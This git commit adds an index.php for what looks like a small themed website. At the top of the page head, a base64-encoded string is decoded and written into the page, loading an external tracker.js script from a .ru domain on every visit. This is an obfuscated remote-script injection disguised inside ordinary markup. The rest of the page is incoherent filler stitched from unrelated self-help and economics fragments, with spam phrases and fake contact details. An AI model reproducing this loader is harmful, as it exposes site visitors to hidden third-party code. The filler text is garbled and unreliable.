7dc86e0b80784e84b0f19c88aab21b8a1a86db38
diwryymt <81931904+diwryymt@users.noreply.github.com>
2021-04-05 00:03:25 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl91cXY3NG9qMTB4NzY5bGhhc2ciPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>You may have the knowledge and wisdom you need to help him, but since your </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="pjrxl984460mrs3iiax7li">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="zdfm3ktnd16mpld">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>You may have the knowledge and wisdom you need to help him, but since your </h1>
+	</section>
+
+
+	<section class="our-work" class="ywy7s2h1xhqt23i3b3dr31">
+		<h3 class="title">The production function itself can be expressed by </h3>
+		<p>Authority: Authority comes from position and role in the church. China Official Coin: Singapore, South Korea, Malaysia.  Each group involved in the conflict is convinced that the problem is “out there” and it will be solved if “they” (meaning others) “change” or “disappear” altogether.  Take a look at your professional role.  Here are some examples:the dramatic improvement in communications has dramatically expanded the boundaries of international financial markets and led to an increase in demand for stocks and bonds.  Problems that are indirectly controlled are resolved by changing our methods of influence.  5.  We cannot prosper without making moneybut making money alone is not a sufficient reason for the organization to exist.  Each time I came across such organizations, I simultaneously discovered inside them a huge accumulation of negative energy, manifested, for example, in rivalry between departments, in an aggressively defensive style of communication, in intrigue and diktat.  When you feel that I see the situation correctly, we will assess to what extent my proposals suit you.  During that summer, he only asked for my help two or three times.  You will open up new opportunities, new lands and continents, and other people will be able to follow you. </p>
+		<hr>
+
+		<ul class="grid" class="7v6lep7tjbwie4fe">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="ywy7s2h1xhqt23i3b3dr31">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>Appreciating the correct principle, we come to the truth - to understanding the phenomena as they are.  - Come on, dear! What's wrong? </td>
+    <td>Prices will continue to decline, which will lead, on the one hand, to a reduction in production, and on the other, to a gradu</td>
+    <td>If other people do not perceive our efforts as a contribution, we tend to think that our good intentions are being neglected and we stop tryin</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>Money in itself is not a production resource, but using it, you can purchase equipment, energy and other resources needed to start production.  Daily a</td>
+    <td>In line with these priorities, they decided to devote about a third of their time to building relationships with tenants.  Their inner orientation i</td>
+    <td>The soul of intrapersonal synergy is embodied in the principles of the first three skills, which endow a person with internal securit</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>- Wonderful! Do you do what you want to doall that remains for me is to act by elimination.  Depending on what form of ow</td>
+    <td>Often they are more a projection of the problems and shortcomings of the people who give these assessments than our real reflection.</td>
+    <td>- In fact? - I doubted.  As you can see from the matrix, activities are determined by two factors:urgent and important.  It seems to me that the ideas presented in</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="pjrxl984460mrs3iiax7li">
+		<h3 class="title">It pissed me off terribly.  Second, he is </h3>
+		<p>The purpose of labor force marketing is to create an effective system for regulating employment.  Consequently, the functions of state bodies are located between the functions of the state and its practical activities.  We do not show the proactive initiative that is necessary for positive change.  Monopolistic enterprises have the ability to influence other market participants from a position of strength, to impose their own conditions on them.  The proposals made in the anonymous theses are outdated.  Only by becoming independent - proactive, focused on correct principles, driven by values ​​and able to organize their lives and act in accordance with priorities,we can choose to become interdependent — able to build rich, reliable, highly effective relationships with others. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="zdfm3ktnd16mpld" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ywy7s2h1xhqt23i3b3dr31">
+		<h3 class="title">You are not reactive.  - Nothing like this! Don't you remember?</h3>
+		<p>Technique, the tip of the iceberg, must have a strong character base. Chinese Coin: Sales Open In Today.  My self-esteem is constantly fluctuating.I am deprived of a sense of stability, stability of my position.  When someone is honored with special recognition, or is struck by unexpected luck or extraordinary success, or someone has made a discovery, people with a Scarcity Mentality feel as if something has been taken from them.  Family-centered people derive a sense of their inner security and self-worth from the traditions of the family, from the culture of the family, or from the reputation of the family.  It seems to me that these three words are the essence of the principle "first seek to understand" and thathow to effectively present your views.  It was the day of a very important football match for our city, and this fact left an imprint on the behavior and psychology of every citizen.  Samuel Johnson Before moving into the field of Social Victory, we must remember that effective interdependence can only be built on the basis of genuine independence.Personal Victory precedes Public Victory.  For all goals, deadlines are set, the resources required and, which is very important, quantitative indicators by which it is easy to monitor whether this goal has been achieved, and if not, then what remains to be done, how much time and other resources it will take.  - I would take over the chores on the weekend and ask someone to help at the beginning of the week so that you can drive safely.  If you want to raise responsible, disciplined children,you must keep this goal in mind during your daily interactions and interactions with them.  B) S1 - absolutely inelastic sentence (E = 0); S2 is an absolutely elastic offer (E =?).  Could you tell me exactly what you think I should do? - His dominant left hemisphere demanded facts, numbers, specifics, breaking the whole into parts.  The income target is too low. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="7v6lep7tjbwie4fe" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="7v6lep7tjbwie4fe" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="pjrxl984460mrs3iiax7li">
+		<h3 class="title">This policy is called accelerated depreciation.  Th</h3>
+		<p>This is not to say that the elements of Personality Ethics, such as personal development, teaching communication skills, and teaching influence and positive thinking, are not useful or sometimes essential to success.  As you know, an imperfect competitor, striving to maintain a high level of prices, is interested in creating.  See, for example, how a house is built.  Schedule a time to get completely out of your business and start working on your Personal Mission Statement.  I will take the initiative necessary to achieve my goals in life.  Such manifestations of the modern social paradigm show that we are largely determined by various programs and conditions.Don't you understand? These estimates are sketchy and disproportionately overblown.  Good parents need to figure it out before judging or grading.  Then I use Habit 4 and tell you, “I see we approach this situation in different ways.  The level of trust is reduced to a minimum. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="zdfm3ktnd16mpld" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ywy7s2h1xhqt23i3b3dr31">
+		<h3 class="title">It was easy to see that all the passengers</h3>
+		<p>And by the way, the boys and I need you too! - My mother is more important than some kind of fishing! “And your husband and children should be more important to you than their mother.  If you stop being a member of the tennis team, you are not playing tennis.  The consumer does not need a microwave oven or a vacuum cleaner as such, but their services.  And when rush hours came, the managers entrusted their salespeople with all the dirty work - inventory, work in the warehouse and cleaning - while they themselves, standing at the checkout, again carried out most of the sales.  If you claim a Win / Win commitment but actually encourage a Win / Lose approach, your program will fail.  Schedule a time to get completely out of your business and start working on your Personal Mission Statement.  producing a limited number of goods, and diversified - producing different goods.  social labor expended on their production.  You know, I have one serious problem.  Goal management was conceived as a constantly operating system for defining specific goals (end results) for each employee's day. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="7v6lep7tjbwie4fe" class="title">X, but donates only 5 units this time.  "Human" dimension.  In </h3>	
+		<p>Just lovely! - Lovely? Yes, it's an old hag! The dispute did not fade away, everyone was confident in their correctness and proved their position. China Official Coin: Singapore, South Korea, Malaysia.  Work on what you can.  In the case of absolutely inelastic demand, they buy the same toit happens for luxury goods (jewelry) and for rather expensive consumer goods (cars).  The more their members are involved in analyzing and solving problems, the more sincere and lasting their participation in this process,the greater the creative dedication of each and the commitment to what he creates.  Material goals are achieved through the implementation of actions (operations, processes, activities).  The consumer who has no alternative has to put up with it; 2) monopoly low price.  The agreement was a win for my daughter - she was allowed to use the car - and, of course, it was a win for Sandra and me. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="pjrxl984460mrs3iiax7li">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="zdfm3ktnd16mpld"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ywy7s2h1xhqt23i3b3dr31"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="7v6lep7tjbwie4fe"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>943 Barrows Roads, Apt. 649, 79940, Port Caryhaven, Wyoming, United States</p>
+		<p>Phone number: +23(51)177-98410</p>
+	</footer>
+
+</body>
+
+</html>
